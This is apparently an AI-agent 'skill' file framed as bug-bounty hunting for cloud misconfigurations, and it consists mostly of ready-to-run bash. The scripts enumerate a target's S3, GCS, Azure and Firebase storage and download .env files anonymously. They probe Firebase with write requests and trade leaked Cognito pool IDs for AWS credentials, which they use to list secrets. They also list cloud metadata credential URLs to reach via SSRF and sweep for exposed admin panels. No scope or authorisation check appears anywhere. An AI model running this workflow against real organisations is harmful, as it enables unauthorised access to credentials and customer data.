---
name: k1nzr3c0n-hunt-cloud-misconfig
description: "Hunt cloud/infra misconfigurations. AWS: public S3 buckets, permissive IAM, CloudWatch RUM Cognito token leak, Lambda URL, IMDSv1 via SSRF. GCP: public GCS buckets, Cloud Run services. Azure: public blob containers. Firebase open rules. Also: exposed admin panels (Grafana/Kibana/ElasticSearch). Validate: actual data read/write/credential."
tags: [cloud, aws, s3, gcp, azure, misconfig, hunt, web-security, bug-bounty]
---

# K1NZR3C0N Hunt — Cloud/Infra Misconfiguration

> **Validate**: actual data access required. HTTP 200 on a bucket URL is not the finding — reading data is.
> **OOB gate for SSRF**: cloud metadata via SSRF requires credential data in callback, not just DNS.

---

## Phase 0 — Setup

```bash
TARGET="${TARGET:-}"
TARGET_ORG="${TARGET_ORG:-$(echo $TARGET | cut -d. -f1)}"
HUNT="/tmp/hunt_cloud_${TARGET//[^a-zA-Z0-9]/_}"
mkdir -p "$HUNT"
OOB="${OOB:-$(openssl rand -hex 4).oastify.com}"
```

## Phase 1 — S3 Bucket Enumeration

```bash
echo "=== S3 Bucket Discovery ==="

# Try common bucket name patterns
for NAME in "$TARGET_ORG" "${TARGET_ORG}-backup" "${TARGET_ORG}-assets" \
  "${TARGET_ORG}-prod" "${TARGET_ORG}-staging" "${TARGET_ORG}-static" \
  "${TARGET_ORG}-media" "${TARGET_ORG}-uploads" "${TARGET_ORG}-files" \
  "${TARGET_ORG}-logs" "${TARGET_ORG}-data" "${TARGET_ORG}-config"; do
  CODE=$(curl -sk -o /tmp/s3_check -w "%{http_code}" "https://${NAME}.s3.amazonaws.com/" -m 10)
  case "$CODE" in
    200) echo "  [PUBLIC-LIST] ${NAME}.s3.amazonaws.com" && cat /tmp/s3_check | head -5 ;;
    403) echo "  [PRIVATE 403] ${NAME}.s3.amazonaws.com — exists but private" ;;
    404|301) ;;
    *) echo "  [$CODE] ${NAME}.s3.amazonaws.com" ;;
  esac
done

echo ""
echo "aws CLI (no credentials — anonymous access test):"
echo "  aws s3 ls s3://BUCKET-NAME --no-sign-request"
echo "  aws s3 ls s3://BUCKET-NAME --no-sign-request --recursive | head -20"
echo "  aws s3 cp s3://BUCKET-NAME/.env /tmp/found.env --no-sign-request"
```

## Phase 2 — GCS / Azure Blob

```bash
echo "=== GCS Bucket Enumeration ==="
for NAME in "$TARGET_ORG" "${TARGET_ORG}-backup" "${TARGET_ORG}-prod"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://storage.googleapis.com/${NAME}/" -m 8)
  [ "$CODE" = "200" ] && echo "  [PUBLIC GCS] ${NAME}"
done

echo ""
echo "=== Azure Blob Enumeration ==="
for NAME in "$TARGET_ORG" "${TARGET_ORG}-prod"; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${NAME}.blob.core.windows.net/" -m 8)
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  [$CODE] ${NAME}.blob.core.windows.net"
done
```

## Phase 3 — Firebase Open Rules

```bash
echo "=== Firebase Open Rules ==="
for APP in "$TARGET_ORG" "${TARGET_ORG}-prod" "${TARGET_ORG}-app" "${TARGET_ORG}-default-rtdb"; do
  # Test public read
  CODE=$(curl -sk -o /tmp/fb_read -w "%{http_code}" "https://${APP}.firebaseio.com/.json" -m 8)
  if [ "$CODE" = "200" ]; then
    echo "  [PUBLIC READ] ${APP}.firebaseio.com"
    cat /tmp/fb_read | head -3
  fi

  # Test public write
  WRITE_CODE=$(curl -sk -X PUT "https://${APP}.firebaseio.com/pentest_probe.json" \
    -d '"probe_$(openssl rand -hex 4)"' -o /dev/null -w "%{http_code}" -m 8)
  [ "$WRITE_CODE" = "200" ] && echo "  [PUBLIC WRITE] ${APP}.firebaseio.com — CRITICAL"
done
```

## Phase 4 — CloudWatch RUM Token Leak

```bash
echo "=== CloudWatch RUM Cognito Token Leak ==="
echo "Look for RUM snippet in JS bundles:"

JS_DIR="/tmp/hunt_js_${TARGET//[^a-zA-Z0-9]/_}/downloaded"
[ -d "$JS_DIR" ] && {
  # Extract identityPoolId
  grep -rhoP 'identityPoolId["\x27]?\s*[:=]\s*["\x27]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})["\x27]' \
    "$JS_DIR" 2>/dev/null | sort -u | sed 's/^/  [COGNITO-POOL] /'

  # Extract guestRoleArn
  grep -rhoP 'guestRoleArn["\x27]?\s*[:=]\s*["\x27](arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+)["\x27]' \
    "$JS_DIR" 2>/dev/null | sort -u | sed 's/^/  [GUEST-ROLE] /'
}

echo ""
echo "If identityPoolId found:"
echo "  aws cognito-identity get-id --identity-pool-id 'POOL_ID' --region us-east-1 --no-sign-request"
echo "  aws cognito-identity get-credentials-for-identity --identity-id 'ID' --region us-east-1 --no-sign-request"
echo "  → Then test: aws sts get-caller-identity (to confirm role)"
echo "  → Run: aws s3 ls && aws dynamodb list-tables && aws secretsmanager list-secrets"
```

## Phase 5 — EC2 Metadata via SSRF

```bash
echo "=== EC2/Cloud Metadata (use via SSRF finding) ==="
echo "AWS IMDSv1 endpoints:"
echo "  http://169.254.169.254/latest/meta-data/iam/security-credentials/"
echo "  http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME"
echo "  http://169.254.169.254/latest/user-data"
echo ""
echo "GCP:"
echo "  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
echo "  (requires header: Metadata-Flavor: Google)"
echo ""
echo "Azure:"
echo "  http://169.254.169.254/metadata/instance?api-version=2020-09-01"
echo "  (requires header: Metadata: true)"
echo ""
echo "Use SSRF from hunt-ssrf skill to reach these. /skill k1nzr3c0n-hunt-ssrf"
```

## Phase 6 — Exposed Admin Panels

```bash
echo "=== Exposed Admin Panels Quick Check ==="
for PANEL in /jenkins /jenkins/script /grafana /grafana/login /kibana /elasticsearch \
  /swagger-ui.html /phpMyAdmin /adminer /console /h2-console /actuator \
  /druid /solr /_cat/indices /prometheus /alertmanager /kubernetes \
  /rancher /portainer /traefik /nagios /zabbix; do
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "https://${TARGET}${PANEL}" -m 5)
  [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "  [$CODE] ${PANEL}"
done
```

## Gate 0

```bash
echo "=== Cloud Misconfig Gate 0 ==="
echo "  □ S3: actual file listing OR reading a sensitive file (not just bucket existence)"
echo "  □ S3 write: write marker file AND read it back from clean session"
echo "  □ Firebase: actual data read OR successful PUT"
echo "  □ Cognito: credentials returned AND at least one non-RUM action permitted"
echo "  □ SSRF→metadata: credentials retrieved from 169.254.169.254"
echo "  □ Admin panel: actual access (not just login page)"
echo ""
echo "  /skill k1nzr3c0n-triage"
```

## Report Formula
```
Public S3 bucket [target-backup.s3.amazonaws.com]: anonymous s3 ls lists 2,847 files; .env file contains DB_PASSWORD and AWS credentials — Critical credential exposure
Firebase database [target-prod.firebaseio.com]: public read/write rules — entire user collection (12k records) readable; write confirmed via PUT to /pentest_probe.json
CloudWatch RUM Cognito pool [us-east-1:abc...] with guestRoleArn granting s3:GetObject on prod bucket — Critical: unauthenticated access to customer data
```
